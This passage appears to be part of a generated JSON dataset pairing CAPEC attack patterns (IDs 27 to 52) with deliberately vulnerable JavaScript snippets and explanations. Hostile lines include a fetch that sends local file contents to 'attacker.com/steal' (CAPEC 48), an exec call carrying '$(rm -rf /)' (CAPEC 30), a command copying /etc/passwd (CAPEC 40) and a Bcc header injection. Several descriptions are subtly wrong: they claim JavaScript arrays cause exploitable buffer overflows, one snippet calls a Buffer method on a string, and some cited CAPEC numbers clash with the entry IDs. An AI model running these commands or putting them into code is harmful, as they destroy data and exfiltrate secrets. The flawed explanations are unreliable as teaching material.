        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst filePath = path.join(__dirname, 'important_file.txt');\n\n// Check if the file exists\nif (fs.existsSync(filePath)) {\n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Read the file content\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000);\n}\n\n// Simulate an attacker replacing the file during the delay\nsetTimeout(() => {\n  fs.writeFile(filePath, 'Malicious content', (err) => {\n    if (err) throw err;\n    console.log('File replaced with malicious content');\n  });\n}, 500);",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability. The code first checks if a file exists and then reads its content after a delay. During this delay, an attacker can replace the file with malicious content. This embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization). The race condition occurs because the file's existence is checked before the delay, allowing an attacker to modify the file before it is read."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst tempFilePath = '/tmp/tempfile';\nconst sensitiveFilePath = '/etc/sensitivefile';\n\n// Check if the temporary file exists\nif (!fs.existsSync(tempFilePath)) {\n  // Simulate a race condition by creating a symbolic link to the sensitive file\n  fs.symlinkSync(sensitiveFilePath, tempFilePath);\n\n  // Create and write to the temporary file\n  fs.writeFileSync(tempFilePath, 'malicious content');\n\n  console.log('Temporary file created and written to.');\n} else {\n  console.log('Temporary file already exists.');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability involving symbolic links. The code first checks if a temporary file exists. If it does not, it creates a symbolic link from the temporary file path to a sensitive file path. Then, it writes malicious content to the temporary file, which actually writes to the sensitive file due to the symbolic link. This embodies the main idea of the CAPEC by exploiting a time-of-check time-of-use (TOCTOU) race condition and improper handling of symbolic links, leading to unauthorized file access and modification."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let input = req.url.split('?')[1];\n  try {\n    // CWE-20: Improper Input Validation\n    if (!input || input.length > 100) {\n      throw new Error('Invalid input');\n    }\n    // CWE-74: Improper Neutralization of Special Elements\n    let sanitizedInput = input.replace(/[^a-zA-Z0-9]/g, '');\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Processed input: ${sanitizedInput}`);\n  } catch (err) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that processes user input from the URL query string. The code demonstrates several common vulnerabilities: \n1. CWE-20 (Improper Input Validation): The input is checked for length but not for other potentially harmful properties.\n2. CWE-74 (Improper Neutralization of Special Elements): The input is sanitized by removing non-alphanumeric characters, but this simplistic approach may not cover all edge cases.\n3. CWE-209 (Generation of Error Message Containing Sensitive Information): Error messages are generated and sent back to the client, potentially exposing sensitive information about the server's internal state.\n\nThe code embodies the main idea of the CAPEC by showing how an attacker could use fuzzing to discover weaknesses in input validation and sanitization, leading to potential exploitation."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst filePath = '/tmp/sensitive_file';\n\n// Time-of-check\nif (fs.existsSync(filePath)) {\n  console.log('File exists, proceeding to read...');\n  \n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Time-of-use\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000); // Delay of 1 second\n} else {\n  console.log('File does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The code first checks if a file exists at a specified path (`/tmp/sensitive_file`). If the file exists, it logs a message and then waits for 1 second before reading the file's content. This delay creates a window of opportunity for an attacker to replace or modify the file between the check (existence check) and the use (reading the file). This embodies the main idea of CAPEC-367, where the state of a resource can change between the check and the use, leading to unexpected behavior. The related CWEs provide additional context, such as improper synchronization and race conditions within threads, which are relevant to this example."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-114: Load a library from an untrusted source\nconst maliciousLibrary = './maliciousLibrary.so';\n\n// CWE-270: Privilege Context Switching Error\nfunction elevatePrivileges() {\n  // Simulate privilege escalation\n  process.setuid(0); // Set user ID to root (privileged)\n}\n\n// CWE-362: Race Condition\nlet sharedResource = false;\nfunction accessSharedResource() {\n  if (!sharedResource) {\n    sharedResource = true;\n    // Critical section\n    exec(`LD_PRELOAD=${maliciousLibrary} /bin/ls`, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n    sharedResource = false;\n  }\n}\n\n// CWE-78: OS Command Injection\nconst userInput = '$(rm -rf /)';\nexec(`ls ${userInput}`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Simulate hijacking a privileged thread\nfunction hijackThread() {\n  elevatePrivileges();\n  accessSharedResource();\n}\n\nhijackThread();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Hijacking a Privileged Thread of Execution' by combining several related CWEs. The code includes a function to elevate privileges (CWE-270), a race condition to access a shared resource (CWE-362), and an example of loading a malicious library (CWE-114). Additionally, it shows an OS command injection vulnerability (CWE-78) by executing a command with user input that is not properly sanitized. The main idea is to illustrate how an attacker can hijack a privileged thread, manipulate its memory, and execute malicious code, potentially leading to elevated privileges and unauthorized actions."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  // Assume user authentication is successful\n  res.cookie('session', JSON.stringify({ username, role: 'user' }), { httpOnly: true });\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionCookie = req.cookies.session;\n  if (!sessionCookie) {\n    return res.status(401).send('Unauthorized');\n  }\n  const sessionData = JSON.parse(sessionCookie);\n  // No validation or integrity check on the cookie data\n  res.send(`Welcome ${sessionData.username}, your role is ${sessionData.role}`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that uses cookies to manage user sessions. The '/login' endpoint sets a session cookie with user information in cleartext, and the '/dashboard' endpoint reads this cookie to display user-specific information. The code embodies the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies by showing how sensitive information is stored in cookies without encryption (CWE-315), without validation and integrity checking (CWE-565), and how this can lead to potential security issues such as session hijacking or impersonation. The lack of proper validation and encryption makes the application vulnerable to attacks where an adversary can intercept, modify, or misuse the cookie data."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: directly using user input in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>User Input: ${userInput}</h1></body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server parses the query string from the URL and directly embeds the user input into the HTML response without any sanitization or escaping. This represents the main idea of the CAPEC 'XSS Through HTTP Query Strings' and demonstrates CWE-80 and CWE-79 by not neutralizing special characters in the user input, CWE-598 by using the GET method to process the request, CWE-116 by not properly encoding the output, and CWE-84 by not neutralizing encoded URI schemes. An attacker could exploit this vulnerability by crafting a URL with malicious script code in the query string, leading to Cross-Site Scripting (XSS) when the victim's browser executes the malicious script."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Simulate a proxy that forwards requests to a backend server\n  const options = {\n    hostname: 'backend-server.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res, { end: true });\n  });\n\n  // Vulnerable to HTTP Request Smuggling\n  req.pipe(proxyReq, { end: true });\n});\n\nserver.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that acts as a proxy, forwarding incoming requests to a backend server. The proxy server does not properly handle or sanitize incoming HTTP requests, making it vulnerable to HTTP Request Smuggling attacks. An attacker can exploit discrepancies in how the proxy and backend server parse HTTP requests to inject malicious requests. This vulnerability is related to CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-113 (Improper Neutralization of CRLF Sequences), and CWE-441 (Unintended Proxy or Intermediary). The code demonstrates how an intermediary HTTP agent can be exploited due to improper handling of HTTP request parsing and forwarding."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query parameter\n  if (userInput) {\n    // Vulnerable to HTTP Response Splitting\n    res.setHeader('Content-Type', 'text/html');\n    res.setHeader('Set-Cookie', `sessionId=abc123; path=/; ${userInput}`);\n    res.end('<html><body>Response</body></html>');\n  } else {\n    res.end('<html><body>No input provided</body></html>');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server takes user input from the URL query parameter and includes it directly in the HTTP response headers without proper sanitization. This makes the server vulnerable to HTTP Response Splitting attacks (CWE-113). An attacker can inject CRLF sequences into the user input to manipulate the HTTP response headers, potentially leading to security issues such as session fixation or cross-site scripting (XSS). The code demonstrates the improper neutralization of special elements (CWE-74, CWE-138) and highlights the risks associated with inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst configPath = 'config.json';\n\n// Read configuration file\nlet configData = fs.readFileSync(configPath, 'utf8');\n\n// Parse configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON in configuration file');\n  process.exit(1);\n}\n\n// Execute code based on configuration\nif (config.execute) {\n  eval(config.execute); // CWE-95: Eval Injection\n}\n\n// Load resource file\nconst resourcePath = config.resourcePath;\nlet resourceData = fs.readFileSync(resourcePath, 'utf8');\n\n// Process resource data\nif (resourceData.includes('<%')) {\n  // CWE-97: Improper Neutralization of Server-Side Includes (SSI)\n  console.log('Potential SSI detected in resource file');\n}\n\n// Improper ownership management\nfs.chownSync(resourcePath, 1000, 1000); // CWE-282: Improper Ownership Management",
        "description": "This JavaScript code snippet demonstrates a scenario where an application reads a configuration file and executes code based on its contents, which can lead to code injection vulnerabilities (CWE-95). The code also reads a resource file and checks for potential server-side includes (SSI) directives, highlighting improper neutralization (CWE-97). Additionally, the code changes the ownership of the resource file without proper verification, illustrating improper ownership management (CWE-282). This snippet embodies the main idea of CAPEC-184 by showing how an attacker can leverage executable code in non-executable files to manipulate the target process."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "function unpublishedFunction() {\n  // Undocumented and unauthorized functionality\n  console.log('This is an unpublished function that should not be accessible.');\n}\n\n// Missing authentication and authorization checks\napp.get('/unpublished', (req, res) => {\n  unpublishedFunction();\n  res.send('Unpublished function invoked');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an unpublished function is exposed through an endpoint without proper authentication or authorization checks. The 'unpublishedFunction' is intended to be private and not accessible to users. However, the '/unpublished' endpoint allows anyone to invoke this function, representing a 'Missing Authentication for Critical Function' (CWE-306) and 'Missing Authorization' (CWE-862) issue. This also aligns with the CAPEC description of using unpublished interfaces or functionality that should not be publicly available."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage (CWE-312)\nlocalStorage.setItem('password', sensitiveData);\n\n// Store sensitive data in a cookie (CWE-315)\ndocument.cookie = `password=${sensitiveData}; path=/`;\n\n// Store sensitive data in cleartext in an executable (CWE-318)\nfunction getSensitiveData() {\n  return sensitiveData;\n}\n\n// Function to clear sensitive data (CWE-226)\nfunction clearSensitiveData() {\n  localStorage.removeItem('password');\n  document.cookie = 'password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';\n  sensitiveData = null;\n}\n\n// Simulate a state transition without clearing sensitive data (CWE-1272)\nfunction stateTransition() {\n  console.log('Transitioning state...');\n  // Sensitive data is still accessible\n  console.log(`Sensitive Data: ${getSensitiveData()}`);\n}\n\n// Example usage\nstateTransition();\nclearSensitiveData();",
        "description": "This JavaScript code snippet demonstrates the main idea of the CAPEC 'Retrieve Embedded Sensitive Data' by showing how sensitive information can be improperly stored and managed. The code stores a user's password in local storage (CWE-312), in a cookie (CWE-315), and within an executable function (CWE-318). It also includes a function to clear the sensitive data (CWE-226), but simulates a state transition without clearing the sensitive data first (CWE-1272). This highlights the potential vulnerabilities and risks associated with improper handling and storage of sensitive information."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User-controlled input for the configuration file path\nlet configFilePath = process.argv[2];\n\n// Vulnerable code: using user-controlled path to load configuration\nlet config;\ntry {\n  config = JSON.parse(fs.readFileSync(configFilePath, 'utf8'));\n} catch (err) {\n  console.error('Error reading configuration file:', err);\n  process.exit(1);\n}\n\n// Using the configuration data\nconsole.log('Configuration loaded:', config);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where the path to a configuration file is controlled by user input (CWE-73: External Control of File Name or Path). The code reads the configuration file from a path provided as a command-line argument, which can be manipulated by an attacker to point to a malicious file. This embodies the main idea of CAPEC-176: Leveraging/Manipulating Configuration File Search Paths, where an attacker can load a malicious resource by influencing the search path. The code does not validate or sanitize the input path, making it susceptible to attacks."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const user = req.query.user;\n  // Assume user authentication is done here\n  res.cookie('auth', Buffer.from(user).toString('base64'), { httpOnly: true, secure: true });\n  res.send('Logged in');\n});\n\napp.get('/profile', (req, res) => {\n  const authCookie = req.cookies.auth;\n  if (!authCookie) {\n    return res.status(401).send('Unauthorized');\n  }\n  const user = Buffer.from(authCookie, 'base64').toString('ascii');\n  // No integrity check on the cookie value\n  res.send(`Welcome ${user}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that uses cookies to manage user authentication. The '/login' endpoint sets an 'auth' cookie with the base64-encoded username after a user logs in. The '/profile' endpoint retrieves the 'auth' cookie and decodes it to get the username. However, this implementation is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Missing Support for Integrity Check (CWE-353)**: The 'auth' cookie is not validated for integrity, allowing an attacker to tamper with the cookie value.\n2. **Improper Authorization (CWE-285)**: The code does not perform proper authorization checks beyond the presence of the cookie.\n3. **Authentication Bypass by Assumed-Immutable Data (CWE-302)**: The 'auth' cookie is assumed to be immutable but can be modified by an attacker.\n4. **Reliance on Cookies without Validation and Integrity Checking (CWE-565)**: The application relies on the cookie value without validating its integrity.\n5. **Cleartext Storage of Sensitive Information in a Cookie (CWE-315)**: Although the cookie is base64-encoded, it is not encrypted, making it easy to decode and manipulate.\n\nThis code snippet embodies the main idea of CAPEC-Token Manipulation by demonstrating how client-side tokens (cookies) can be manipulated if not properly protected and validated."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Simulate an attacker writing to a terminal device\nconst terminalDevice = '/dev/pts/1';\nconst maliciousCommand = 'cat /etc/passwd > /tmp/stolen_passwd\\n';\n\n// Write the malicious command to the terminal device\nfs.writeFile(terminalDevice, maliciousCommand, (err) => {\n  if (err) throw err;\n  console.log('Malicious command written to terminal device');\n});\n\n// Simulate the victim executing the command\nexec('cat /tmp/stolen_passwd', (err, stdout, stderr) => {\n  if (err) throw err;\n  console.log(`Stolen data: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Manipulating Writeable Terminal Devices' (CAPEC-). The attacker writes a malicious command to a terminal device that is writable by other users. The command, when executed by the victim, copies the contents of '/etc/passwd' to a temporary file '/tmp/stolen_passwd'. The attacker can then read this file to obtain sensitive information. The code also highlights related CWEs such as Command Injection (CWE-77, CWE-78) by constructing a command with potentially dangerous input, and Exposure of Sensitive Information (CWE-214) by making the stolen data accessible."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "function sendEmail(to, subject, body) {\n    var emailHeaders = `To: ${to}\\nSubject: ${subject}\\n`;\n    var emailBody = body;\n    var email = emailHeaders + '\\n' + emailBody;\n    // Simulate sending email\n    console.log('Sending email:', email);\n}\n\n// Example of vulnerable input\nvar maliciousSubject = \"Normal Subject\\nBcc: attacker@example.com\\n\";\nsendEmail('victim@example.com', maliciousSubject, 'This is the body of the email.');",
        "description": "This JavaScript code snippet demonstrates a vulnerable email sending function that constructs email headers using user input without proper neutralization of meta-characters. The `sendEmail` function takes `to`, `subject`, and `body` as parameters and constructs the email headers and body. The `maliciousSubject` variable contains a newline character followed by a Bcc header, which is an example of injecting additional email headers. When `sendEmail` is called with this malicious subject, it results in an email with an unintended Bcc header, demonstrating the vulnerability described in the CAPEC. This code snippet embodies CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences) and CWE-88 (Improper Neutralization of Argument Delimiters in a Command)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(input) {\n  let buffer = new Array(256);\n  for (let i = 0; i < input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\nlet userInput = 'A'.repeat(300); // Simulating a long input\nlet mimeData = convertToMIME(userInput);\nconsole.log(mimeData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable MIME conversion routine. The function `convertToMIME` takes an input string and converts it to a MIME-compatible format by copying each character's char code into a fixed-size buffer of 256 elements. However, the function does not check if the input length exceeds the buffer size, leading to a classic buffer overflow vulnerability (CWE-120). This can cause the program to write outside the bounds of the buffer (CWE-119), potentially allowing an attacker to execute arbitrary code. The `userInput` variable simulates an attacker providing a long input string, which exceeds the buffer size and triggers the overflow."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "function processInput(input) {\n  // First parser layer\n  input = input.replace(/\\\\/g, ''); // Remove backslashes\n  \n  // Input validation layer\n  if (/[^a-zA-Z0-9]/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  \n  // Second parser layer\n  input = input.replace(/\\$/g, ''); // Remove dollar signs\n  \n  // Use the input in a command\n  const command = `echo ${input}`;\n  require('child_process').exec(command, (err, stdout, stderr) => {\n    if (err) {\n      console.error(`Error: ${stderr}`);\n    } else {\n      console.log(`Output: ${stdout}`);\n    }\n  });\n}\n\n// Example of exploiting the vulnerability\ntry {\n  processInput('valid$input'); // This will pass validation but can be manipulated\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before all parsing layers are applied. The `processInput` function first removes backslashes, then validates the input to ensure it only contains alphanumeric characters. However, after validation, it removes dollar signs. An attacker can exploit this by providing input like 'valid$input', which passes validation but is transformed into 'validinput' after the second parsing layer, potentially leading to command injection. This example embodies the CAPEC concept of exploiting multiple input interpretation layers and highlights related CWEs such as improper input validation (CWE-20) and improper neutralization of special elements (CWE-77, CWE-78)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function loadImage(file) {\n  const reader = new FileReader();\n  reader.onload = function(event) {\n    const buffer = new ArrayBuffer(1024); // Fixed buffer size\n    const view = new Uint8Array(buffer);\n    const data = new Uint8Array(event.target.result);\n    for (let i = 0; i < data.length; i++) {\n      view[i] = data[i]; // Potential buffer overflow\n    }\n    // Process the image data\n    processImage(view);\n  };\n  reader.readAsArrayBuffer(file);\n}\n\nfunction processImage(data) {\n  // Dummy function to process image data\n  console.log('Processing image data:', data);\n}",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability when handling binary resources, such as image files. The `loadImage` function reads a file using the FileReader API and attempts to copy its contents into a fixed-size buffer. If the file size exceeds the buffer size, this can lead to a buffer overflow, allowing an attacker to execute arbitrary code. This example embodies the main idea of CAPEC-Overflow Binary Resource File and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readSymbolicLink(filePath) {\n  try {\n    const resolvedPath = fs.readlinkSync(filePath);\n    const buffer = Buffer.alloc(256); // Fixed buffer size\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n\n    // CWE-120: Buffer Copy without Checking Size of Input\n    data.copy(buffer, 0, 0, data.length);\n\n    console.log('Data:', buffer.toString());\n  } catch (err) {\n    console.error('Error:', err);\n  }\n}\n\n// Example usage\nreadSymbolicLink('/tmp/symlink');",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The function `readSymbolicLink` takes a file path, resolves it to its target using `fs.readlinkSync`, and reads the content of the target file. The content is then copied into a fixed-size buffer without checking if the content size exceeds the buffer size, leading to a classic buffer overflow (CWE-120). This example embodies the main idea of the CAPEC by showing how symbolic links can be manipulated to cause buffer overflows due to insufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "function processConfig(config) {\n  var buffer = new Array(256);\n  for (var i = 0; i < config.tags.length; i++) {\n    buffer[i] = config.tags[i]; // CWE-120: No size check\n  }\n  return buffer.join('');\n}\n\nvar maliciousConfig = {\n  tags: new Array(300).fill('A') // Oversized input to cause overflow\n};\n\nconsole.log(processConfig(maliciousConfig));",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a configuration object with tags is processed without proper size checks, leading to a buffer overflow. The function `processConfig` takes a configuration object and copies its tags into a fixed-size buffer of 256 elements. However, it does not check if the number of tags exceeds the buffer size, which can lead to a buffer overflow (CWE-120). The `maliciousConfig` object simulates an attack by providing an oversized array of 300 elements, which exceeds the buffer's capacity and causes an overflow. This example embodies the main idea of the CAPEC by showing how an adversary can exploit improperly handled configuration data to cause a buffer overflow."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function vulnerableFunction(input) {\n  const buffer = new Array(10);\n  let expandedInput = input.repeat(2); // Expands the input size\n  for (let i = 0; i < expandedInput.length; i++) {\n    buffer[i] = expandedInput[i]; // No bounds checking\n  }\n  return buffer.join('');\n}\n\n// Example usage\nlet userInput = '1234567890';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerableFunction` takes an input string and expands it by repeating it twice. It then attempts to copy the expanded input into a fixed-size buffer of 10 elements without performing any bounds checking. This can lead to a buffer overflow if the expanded input exceeds the buffer size. The code embodies the main idea of CAPEC-1000 by showing how input expansion can lead to a buffer overflow when the software fails to anticipate the increased size. The related CWEs are represented by the lack of bounds checking (CWE-120), improper restriction of operations within the buffer (CWE-119), and incorrect calculation of buffer size (CWE-131)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchResource(url) {\n  if (url.startsWith('file://')) {\n    fetch(url)\n      .then(response => response.text())\n      .then(data => {\n        // Send the local file content to an external server\n        fetch('https://attacker.com/steal', {\n          method: 'POST',\n          headers: {'Content-Type': 'application/json'},\n          body: JSON.stringify({fileContent: data})\n        });\n      })\n      .catch(error => console.error('Error fetching local file:', error));\n  } else {\n    fetch(url)\n      .then(response => response.text())\n      .then(data => console.log('Fetched data:', data))\n      .catch(error => console.error('Error fetching URL:', error));\n  }\n}\n\n// Example usage\nfetchResource('file:///C:/Users/username/Documents/sensitive.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a function `fetchResource` is designed to fetch resources based on a given URL. If the URL starts with 'file://', it fetches a local file and sends its content to an external server controlled by an attacker. This embodies the CAPEC concept of 'Passing Local Filenames to Functions That Expect a URL'. The code also touches on related CWEs: improper handling of unexpected data types (CWE-241) by not validating the URL properly, use of incorrectly-resolved name or reference (CWE-706) by accessing local files, and use of GET request method with sensitive query strings (CWE-598) by potentially exposing sensitive data."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const users = [{username: 'user1', password: 'password123'}, {username: 'user2', password: '123456'}];\n\nfunction authenticate(username, password) {\n  for (let user of users) {\n    if (user.username === username && user.password === password) {\n      return 'Authentication successful';\n    }\n  }\n  return 'Authentication failed';\n}\n\n// Simulate brute force attack\nconst possiblePasswords = ['password123', '123456', 'password', 'admin', 'letmein'];\nfor (let pass of possiblePasswords) {\n  console.log(authenticate('user1', pass));\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to brute force attacks. The `users` array stores user credentials in plaintext, which is a direct violation of CWE-257 (Storing Passwords in a Recoverable Format). The `authenticate` function checks the provided username and password against the stored credentials without any rate limiting, making it susceptible to brute force attacks (CWE-307). The code then simulates a brute force attack by iterating over a list of possible passwords and attempting to authenticate with each one. This highlights the risk of weak password requirements (CWE-521) and the lack of multi-factor authentication (CWE-308)."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "const users = { 'user1': { 'password': 'password123', 'securityQuestion': 'petName', 'securityAnswer': 'fluffy' } }; \n\nfunction recoverPassword(username, answer) { \n  if (users[username] && users[username].securityAnswer === answer) { \n    return users[username].password; \n  } else { \n    return 'Security answer incorrect'; \n  } \n} \n\nconsole.log(recoverPassword('user1', 'fluffy')); // Outputs: password123",
        "description": "This JavaScript code snippet demonstrates a weak password recovery mechanism. It stores user passwords in a recoverable format and uses a simple security question for password recovery. If an attacker knows or guesses the answer to the security question, they can retrieve the user's password. This embodies the main idea of CAPEC-139 (Password Recovery Exploitation) and highlights related CWEs such as CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials). The code is vulnerable because it allows easy retrieval of passwords, which can be exploited by attackers."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {};\n\n// Improper Authorization (CWE-285)\napp.post('/register', (req, res) => {\n  const { serviceName, serviceUrl } = req.body;\n  registry[serviceName] = serviceUrl;\n  res.send('Service registered');\n});\n\n// Cleartext Storage in the Registry (CWE-314)\napp.get('/lookup/:serviceName', (req, res) => {\n  const serviceUrl = registry[req.params.serviceName];\n  if (serviceUrl) {\n    res.send(`Service URL: ${serviceUrl}`);\n  } else {\n    res.status(404).send('Service not found');\n  }\n});\n\n// Exposure of WSDL File Containing Sensitive Information (CWE-651)\napp.get('/wsdl/:serviceName', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <service name=\"${req.params.serviceName}\">\n    <documentation>WSDL for ${req.params.serviceName}</documentation>\n  </service>\n</definitions>`;\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('Registry service running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple web service registry using Express.js. It embodies the main idea of the CAPEC 'Poison Web Service Registry' by demonstrating how a registry can be poisoned due to several vulnerabilities:\n\n1. **Improper Authorization (CWE-285)**: The `/register` endpoint allows any client to register a service without any authorization checks, making it possible for an attacker to register malicious services.\n\n2. **Cleartext Storage in the Registry (CWE-314)**: The service URLs are stored in cleartext within the `registry` object, which can be easily accessed and manipulated.\n\n3. **Exposure of WSDL File Containing Sensitive Information (CWE-651)**: The `/wsdl/:serviceName` endpoint exposes a WSDL file that contains information about the service, which can be used by an attacker to understand and exploit the service.\n\nThis code snippet highlights the risks associated with a poorly protected web service registry, which can lead to service redirection, incorrect information dissemination, and exposure of sensitive data."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filename) {\n  if (filename.includes('\\0')) {\n    throw new Error('Invalid filename');\n  }\n  fs.readFile(filename, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('example.txt\\0hidden.txt');",
